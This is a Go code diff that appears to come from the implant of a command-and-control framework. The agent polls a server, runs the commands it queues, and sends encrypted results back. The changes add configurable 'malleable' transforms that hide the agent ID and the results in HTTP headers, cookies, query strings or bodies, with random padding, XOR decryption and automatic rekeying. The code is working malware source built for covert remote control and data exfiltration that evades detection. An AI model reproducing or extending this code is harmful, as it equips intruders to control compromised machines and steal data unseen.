@@ -132,16 +132,8 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 	_, postURL := handshakeManager.GetCurrentURLs()
 	decryptedValues := handshakeManager.decryptedValues
 
-	postData := struct {
-		Data string `json:"data"`
-	}{
-		Data: encryptedData,
-	}
-
-	jsonData, err := json.Marshal(postData)
-	if err != nil {
-		return fmt.Errorf(ErrCtx(E18, err.Error()))
-	}
+	// Get transform DataBlocks
+	_, postClientIDDataBlock, postDataDataBlock, _ := handshakeManager.GetTransformDataBlocks()
 
 	// Get the custom POST method from decrypted values
 	method := decryptedValues[geKeyPostMethod]
@@ -149,14 +141,97 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 		method = geMethodPost // Fallback to default
 	}
 
+	var bodyData []byte
+	var transformedData []byte
+	var prependLen, appendLen int
+	var dataOutputLocation string
+
+	// Check if POST data transforms are configured
+	if postDataDataBlock != nil && len(postDataDataBlock.Transforms) > 0 {
+		// Apply transforms to the encrypted data
+		transformed, err := applyTransforms([]byte(encryptedData), postDataDataBlock.Transforms)
+		if err != nil {
+			return fmt.Errorf(ErrCtx(E18, err.Error()))
+		}
+		transformedData = transformed.Data
+		prependLen = transformed.PrependLength
+		appendLen = transformed.AppendLength
+		dataOutputLocation = postDataDataBlock.Output
+
+		// Check if output is body or elsewhere
+		locType, _ := parseOutput(dataOutputLocation)
+		if locType == "body" {
+			bodyData = transformedData
+		} else {
+			// Data goes in header/cookie/query - send empty or minimal body
+			bodyData = []byte("{}")
+		}
+	} else {
+		// Legacy: wrap in JSON
+		postData := struct {
+			Data string `json:"data"`
+		}{
+			Data: encryptedData,
+		}
+		jsonData, err := json.Marshal(postData)
+		if err != nil {
+			return fmt.Errorf(ErrCtx(E18, err.Error()))
+		}
+		bodyData = jsonData
+		dataOutputLocation = "body"
+	}
+
 	// Create request with custom method
-	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(jsonData))
+	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(bodyData))
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 
-	req.Header.Set(httpHeaderContentType, pollContentTypeJson)
+	// Set content type based on transform mode
+	if postDataDataBlock != nil && len(postDataDataBlock.Transforms) > 0 {
+		// For transformed data, use content type from decrypted values or default
+		contentType := decryptedValues[geKeyContentType]
+		if contentType != "" {
+			req.Header.Set(httpHeaderContentType, contentType)
+		}
+	} else {
+		req.Header.Set(httpHeaderContentType, pollContentTypeJson)
+	}
+
 	req.Header.Set(httpHeaderUserAgent, decryptedValues[geKeyUserAgent])
+
+	// Add padding length headers if random transforms were used
+	if prependLen > 0 {
+		req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", prependLen))
+	}
+	if appendLen > 0 {
+		req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", appendLen))
+	}
+
+	// Apply clientID transforms if configured
+	if postClientIDDataBlock != nil && len(postClientIDDataBlock.Transforms) > 0 {
+		transformed, err := applyTransforms([]byte(clientID), postClientIDDataBlock.Transforms)
+		if err != nil {
+			return fmt.Errorf(ErrCtx(E18, err.Error()))
+		}
+		placeInLocation(req, postClientIDDataBlock.Output, transformed.Data, transformed.PrependLength, transformed.AppendLength)
+	}
+
+	// Place POST data in configured location (if not body)
+	if dataOutputLocation != "" && dataOutputLocation != "body" {
+		locType, _ := parseOutput(dataOutputLocation)
+		if locType != "body" {
+			placeInLocation(req, dataOutputLocation, transformedData, prependLen, appendLen)
+			// Set X-Pad headers for non-body POST data (after placeInLocation to not be overwritten)
+			if prependLen > 0 {
+				req.Header.Set(httpHeaderPadPre, fmt.Sprintf("%d", prependLen))
+			}
+			if appendLen > 0 {
+				req.Header.Set(httpHeaderPadApp, fmt.Sprintf("%d", appendLen))
+			}
+		}
+	}
+
 	for key, value := range customHeaders {
 		req.Header.Set(key, value)
 	}
@@ -188,11 +263,10 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 
 // doPoll performs a single poll cycle
 func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
-	// Get current URLs dynamically
 	getURL, _ := handshakeManager.GetCurrentURLs()
 	decryptedValues := handshakeManager.decryptedValues
+	getClientIDDataBlock, _, _, responseDataDataBlock := handshakeManager.GetTransformDataBlocks()
 
-	// Get the custom GET method from decrypted values
 	method := decryptedValues[geKeyGetMethod]
 	if method == "" {
 		method = geMethodGet // Fallback to default
@@ -202,6 +276,19 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	req, err := http.NewRequest(method, getURL, nil)
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E12, err.Error()))
+	}
+
+	// Apply clientID transforms if configured
+	if getClientIDDataBlock != nil {
+		if len(getClientIDDataBlock.Transforms) > 0 {
+			transformed, err := applyTransforms([]byte(clientID), getClientIDDataBlock.Transforms)
+			if err != nil {
+				return fmt.Errorf(ErrCtx(E18, err.Error()))
+			}
+			placeInLocation(req, getClientIDDataBlock.Output, transformed.Data, transformed.PrependLength, transformed.AppendLength)
+		} else {
+			placeInLocation(req, getClientIDDataBlock.Output, []byte(clientID), 0, 0)
+		}
 	}
 
 	// Set headers
@@ -236,35 +323,99 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		return fmt.Errorf(ErrCtx(E10, err.Error()))
 	}
 
-	// First try to parse as raw JSON
-	var rawResponse map[string]interface{}
-	if err := json.Unmarshal(body, &rawResponse); err != nil {
-		return fmt.Errorf(ErrCtx(E18, err.Error()))
-	}
-
 	// Use a generic response map instead of struct to support malleable field names
 	var responseMap map[string]interface{}
 
-	// Check if this is an XOR encrypted response
-	// Try to detect by checking if the malleable status field exists
-	if _, hasStatus := rawResponse[MALLEABLE_REKEY_STATUS_FIELD]; !hasStatus && len(rawResponse) > 0 {
-		// Likely encrypted, try to decrypt
+	// Check if response transforms are configured
+	if responseDataDataBlock != nil && len(responseDataDataBlock.Transforms) > 0 {
+		// Get padding lengths from response headers
+		prependLen, _ := strconv.Atoi(resp.Header.Get(httpHeaderPadPre))
+		appendLen, _ := strconv.Atoi(resp.Header.Get(httpHeaderPadApp))
 
-		// Get current secret from secureComms
-		currentSecret := secureComms.secret1 // Direct access to field
-		xorKey := deriveXORKey(clientID, currentSecret)
+		// Check output location - extract from header/cookie if not body
+		locType, locName := parseOutput(responseDataDataBlock.Output)
 
-		decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
+		var responseData []byte
+		switch locType {
+		case "header":
+			// Extract from header - server base64 encodes when placing in header
+			headerValue := resp.Header.Get(locName)
+			if headerValue == "" {
+				return fmt.Errorf(ErrCtx(E18, "response header empty"))
+			}
+			// Base64 decode (server adds extra encoding for header safety)
+			responseData, err = base64.StdEncoding.DecodeString(headerValue)
+			if err != nil {
+				return fmt.Errorf(ErrCtx(E18, err.Error()))
+			}
+		case "cookie":
+			// Extract from cookie - server base64 encodes when placing in cookie
+			for _, cookie := range resp.Cookies() {
+				if cookie.Name == locName {
+					responseData, err = base64.StdEncoding.DecodeString(cookie.Value)
+					if err != nil {
+						return fmt.Errorf(ErrCtx(E18, err.Error()))
+					}
+					break
+				}
+			}
+			if responseData == nil {
+				return fmt.Errorf(ErrCtx(E18, "response cookie not found"))
+			}
+		default:
+			// Body - use as-is
+			responseData = body
+		}
+
+		// Reverse transforms on the extracted data
+		body, err = reverseTransforms(responseData, responseDataDataBlock.Transforms, prependLen, appendLen)
 		if err != nil {
-			// Couldn't decrypt, use raw response
-			responseMap = rawResponse
-		} else {
-			// Successfully decrypted
-			responseMap = decryptedMap
+			return fmt.Errorf(ErrCtx(E18, err.Error()))
+		}
+
+		// After reversing transforms, body is raw XOR-encrypted bytes
+		// XOR decrypt directly (not base64 encoded)
+		currentSecret := secureComms.secret1
+		xorKey := deriveXORKey(clientID, currentSecret)
+		decrypted := xorDecryptBytes(body, xorKey)
+
+		// Parse the decrypted JSON
+		if err := json.Unmarshal(decrypted, &responseMap); err != nil {
+			previewLen := len(decrypted)
+			if previewLen > 100 {
+				previewLen = 100
+			}
+			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
 	} else {
-		// Unencrypted response
-		responseMap = rawResponse
+		// Legacy: no transforms - body is JSON with encrypted field inside
+		// First try to parse as raw JSON
+		var rawResponse map[string]interface{}
+		if err := json.Unmarshal(body, &rawResponse); err != nil {
+			return fmt.Errorf(ErrCtx(E18, err.Error()))
+		}
+
+		// Check if this is an XOR encrypted response
+		// Try to detect by checking if the malleable status field exists
+		if _, hasStatus := rawResponse[MALLEABLE_REKEY_STATUS_FIELD]; !hasStatus && len(rawResponse) > 0 {
+			// Likely encrypted, try to decrypt
+
+			// Get current secret from secureComms
+			currentSecret := secureComms.secret1 // Direct access to field
+			xorKey := deriveXORKey(clientID, currentSecret)
+
+			decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
+			if err != nil {
+				// Couldn't decrypt, use raw response
+				responseMap = rawResponse
+			} else {
+				// Successfully decrypted
+				responseMap = decryptedMap
+			}
+		} else {
+			// Unencrypted response
+			responseMap = rawResponse
+		}
 	}
 
 	// Extract values using malleable field names
@@ -286,12 +437,8 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		responseCommandDBID = cmdIDVal
 	}
 
-	// Check for rekey command (special status that doesn't require decryption)
-	// Debug: Print the compile-time MALLEABLE_REKEY_COMMAND value
-	//fmt.Printf("[DEBUG] MALLEABLE_REKEY_COMMAND compiled value: %q\n", MALLEABLE_REKEY_COMMAND)
-	//fmt.Printf("[DEBUG] response status from server: %q\n", responseStatus)
+	// Check for rekey command
 	if responseStatus == MALLEABLE_REKEY_COMMAND {
-		//fmt.Println("[DEBUG] Received rekey command from server - MATCH FOUND!")
 
 		// Extract command DB ID for the rekey result
 		var commandDBID int
@@ -305,7 +452,6 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		}
 
 		// Execute rekey command directly without decryption
-		//fmt.Println("[DEBUG] Executing rekey command...")
 
 		// Create result for the rekey command first (before triggering rekey)
 		rekeyResult := &CommandResult{
@@ -319,26 +465,15 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			ExitCode:    0,
 		}
 
-		// Queue the result to be sent back
-		if err := resultManager.AddResult(rekeyResult); err != nil {
-		} else {
-		}
+		resultManager.AddResult(rekeyResult)
 
-		// Perform handshake refresh in a separate goroutine to avoid deadlock
-		// Use atomic flag to prevent multiple concurrent rekey operations
 		if rekeyInProgress.CompareAndSwap(false, true) {
 			go func() {
 				defer rekeyInProgress.Store(false)
-				//fmt.Println("[DEBUG] Starting rekey in background...")
-				if err := refreshHandshake(); err != nil {
-				} else {
-					//fmt.Println("[DEBUG] Rekey completed successfully")
-				}
+				refreshHandshake()
 			}()
 		}
 
-		// Return immediately - the new goroutine will handle the rekey
-		// This allows the current polling goroutine to exit cleanly
 		return fmt.Errorf(Err(E19))
 	}
 
@@ -352,50 +487,31 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		decrypted, err := secureComms.DecryptMessage(responseData)
 		if err != nil {
 			// Log decryption failure which might indicate key desync
-			//fmt.Println("[DEBUG] Key desync detected - initiating automatic rekey")
 
 			// Automatically trigger rekey in background
 			// Use atomic flag to prevent multiple concurrent rekey operations
 			if rekeyInProgress.CompareAndSwap(false, true) {
 				go func() {
 					defer rekeyInProgress.Store(false)
-					//fmt.Println("[DEBUG] Starting automatic rekey due to decryption failure...")
-					if rekeyErr := refreshHandshake(); rekeyErr != nil {
-					} else {
-						//fmt.Println("[DEBUG] Automatic rekey completed successfully")
-					}
+					refreshHandshake()
 				}()
 			}
-
-			// Return nil instead of error to prevent cascading failures
-			// The rekey will restart polling with fresh keys
 			return nil
 		}
 
-		//fmt.Printf("[DEBUG] Decrypted command data from server: %s\n", decrypted)
 
-		if err := commandQueue.AddCommands(decrypted); err != nil {
-			//return fmt.Errorf("failed to queue commands: %v", err)
-		}
+		commandQueue.AddCommands(decrypted)
 
-		// Process commands
-		//fmt.Println("[DEBUG] Starting to process commands...")
 		for {
 			result, err := commandQueue.ProcessNextCommand()
 			if err != nil {
 				continue
 			}
 			if result == nil {
-				//fmt.Println("[DEBUG] No more commands to process")
 				break
 			}
-			/*
-			 */
-			if err := resultManager.AddResult(result); err != nil {
-			} else {
-			}
+			resultManager.AddResult(result)
 		}
-		//fmt.Println("[DEBUG] Command processing complete, rotating secret")
 		secureComms.RotateSecret()
 	}
 
@@ -404,6 +520,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 
 // startPolling initializes and starts the polling routine
 func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
+
 	// Use the SecureComms from HandshakeManager instead of creating a new one
 	secureComms := handshakeManager.GetSecureComms()
 	if secureComms == nil {
@@ -429,6 +546,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 
 	// Add to WaitGroup before starting goroutine
 	currentPolling.Add(1)
+
 
 	go func() {
 		// Ensure we call Done when goroutine exits
@@ -468,7 +586,6 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 				nextInterval = backoffInterval
 			}
 
-			// Handle pending results before sleep
 			if resultManager.HasResults() {
 				results := resultManager.GetPendingResults()
 				if len(results) > 0 {
@@ -479,24 +596,11 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 						AgentID: clientID,
 						Results: results,
 					}
-					//fmt.Println("\n=== Outgoing Command Queue Before Encryption ===")
 					jsonData, err := json.Marshal(encryptedData)
-					if err != nil {
-					} else {
-						// ADD DEBUG TO SHOW JSON STRUCTURE
-						preview := string(jsonData)
-						if len(preview) > 500 {
-							preview = preview[:500] + "..."
-						}
-
-						//fmt.Println(string(jsonData))
+					if err == nil {
 						encrypted, err := secureComms.EncryptMessage(string(jsonData))
-						if err != nil {
-						} else {
-							// Updated call - no config parameter
-							if err := sendResults(encrypted, customHeaders); err != nil {
-							} else {
-								// Only cleanup after confirmed send
+						if err == nil {
+							if err := sendResults(encrypted, customHeaders); err == nil {
 								for _, result := range results {
 									if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
 										commandQueue.mu.Lock()
